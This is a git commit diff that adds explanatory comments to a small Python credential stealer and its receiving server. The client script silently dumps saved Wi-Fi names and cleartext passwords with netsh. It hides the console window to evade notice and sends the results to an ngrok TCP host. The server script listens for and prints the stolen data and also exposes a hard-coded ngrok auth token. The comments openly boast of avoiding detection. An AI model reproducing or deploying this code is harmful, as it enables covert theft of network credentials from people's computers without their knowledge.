f036d601be2e9a4e90a7fcd70eb404c35a214c6b
AstralSomething <163371904+AstralSomething@users.noreply.github.com>
2026-09-23 11:02:52 +1200

    Add files via upload
    added comments

--- WIFIPASSWORDGRABBER.py
+++ WIFIPASSWORDGRABBER.py
@@ -1,13 +1,26 @@
+# The program has two different methods of connection, Method 1 and 2.
+# Subprocess allows the program to run commands through windows built in command console
+# socket and ngrok are what allows the programs to connect and send information to each other
 import subprocess
 import socket
 import ngrok
 
+# Look aroun line 36 for the place to put the string of numbers from the server
+
+# results2 is created as a blank string variable
+# the CREATE_NO_WINDOW variable is created which contains a code that when Windows reads it prevents
+# Windows from creating a window of what commands are being run, preventing the client computer from
+# detecting anything malicious
 results2 = ""
 CREATE_NO_WINDOW = 0x08000000
 
+# uses subprocess to run the commands that look for the wifi names and the system name
+# using CREATE_NO_WINDOW to prevent the console from being created and then decoding them from utf-8
 wifiCommand = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
 systemNameCommand = subprocess.check_output(['hostname'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
 
+# attempts to print the name of the system, which if the system name doesn't exist it won't break and
+# will instead output that the system name is unavailable, preventing errors.
 try:
     print(systemNameCommand[0])
     results2 = "System Name: " + systemNameCommand[0] + "\n"
@@ -15,7 +28,11 @@ except:
     results2 = "SYSTEM NAME UNAVAILABLE" + "\n"
 
 
+# adds a title to results2
 results2 += "WiFi Results\n"
+
+# uses the wifi names to get the wifi passwords using more commands, and then makes it readable
+# for when it is outputted using formatting
 profiles = [i.split(":")[1][1:-1] for i in wifiCommand if "All User Profile" in i]
 for i in profiles:
     results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
@@ -27,20 +44,26 @@ for i in profiles:
     except IndexError:
         print ("{:<50}|  {:<}".format(i, ""))
 
+# prints out the results for testing, doesn't actually show up on client computer, and then sets up
+# the socket for the connection of server and client
 print(results2)
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+# METHOD 1
 try:
-    # Connect to the listening server address
+    # Connect to the listening server address, this is where you change the id for server and client connection.
     client_socket.connect(('0.tcp.au.ngrok.io', 19030))
     
     # Send the encoded data payload
     client_socket.sendall(results2.encode('utf-8'))
 
+# METHOD 2
 except:
     print("Connect error occurred. Attempt to open alternate.")
     client_socket.connect(('127.0.0.1', 8080))
     client_socket.sendall(results2.encode('utf-8'))
-    
+
+# closes program once done to make sure the program only runs for about 10 seconds, making it much
+# harder to detect
 finally:
     client_socket.close()
--- serverside.py
+++ serverside.py
@@ -1,19 +1,31 @@
+# Modules required for server, ngrok serves as 3rd party cross network communication
+# and socket is for allowing the server to be connected too by the client in Method 1 and 2
+# described in WIFIPASSWORDGRABBER.py
 import socket
 import ngrok
 
+# Usually you would hide this in the system for security reasons, however I need other people
+# to be able to use ngrok and I don't mind if people have access to this, due to it being free
 ngrokToken = "3HyzaTZHwEjTDYAwU0XYRX6Jshc_44xz1euDXComEJHTU9B1N"
 
+# establishes a ngrok listener, essentially telling the ngrok servers that this computer exists
+# using the ngrok token to connect to my account, and proto telling ngrok what type of connection
+# we require
 listener = ngrok.forward("localhost:8080", authtoken=ngrokToken, proto="tcp")
 
+# Prints out url connection so we can plug it into WIFIPASSWORDGRABBER.py
 print(f"Listener established at: {listener.url()}");
 
 
-# Create an IPv4 TCP socket
+# Creates an IPv4 TCP socket
+# Essentially connects a socket of the computer to ngrok's servers, making the socket wait for ngrok
+# to send something over from the client script
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server_socket.bind(('127.0.0.1', 8080))
 server_socket.listen()
 
+# Waits for a connection to happen
 while True:
     # Accept connection from client program
     conn, addr = server_socket.accept()
@@ -24,6 +36,6 @@ while True:
         data = conn.recv(4096).decode('utf-8')
         if data:
             print(f"{data}")
-            
+    # This finally allows for more information to be sent rather than just closing the program  
     finally:
         conn.close()
